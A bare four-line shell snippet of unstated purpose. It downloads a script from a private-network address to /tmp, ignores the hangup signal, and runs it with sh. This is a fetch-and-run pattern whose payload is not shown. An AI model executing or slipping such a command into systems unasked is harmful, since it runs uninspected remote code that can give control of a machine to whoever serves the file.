wget -q -O /tmp/ok.sh http://192.168.1.44:18765/_ok.sh
sed -i 's/\r$//' /tmp/ok.sh
trap '' HUP
sh /tmp/ok.sh
